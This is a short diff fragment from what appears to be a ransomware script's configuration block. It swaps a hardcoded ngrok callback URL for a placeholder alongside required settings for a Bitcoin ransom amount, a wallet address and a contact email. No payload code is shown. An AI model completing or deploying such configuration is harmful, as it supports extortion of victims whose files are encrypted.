@@ -20,7 +20,7 @@ print(dkrpt)
 
 # some GLOBALS
 
-url = "http://fdb79803879f.ngrok.io"                             # <----  REQUIRED
+url = "YOUR_NGROK_URL_HERE"                             # <----  REQUIRED
 BTC_AMOUNT = 0.03                                       # <----  REQUIRED
 BTC_WALLET = "YOUR_BTC_WALLET_HERE"                     # <----  REQUIRED
 EMAIL = "YOUR_EMAIL_HERE"                               # <----  REQUIRED
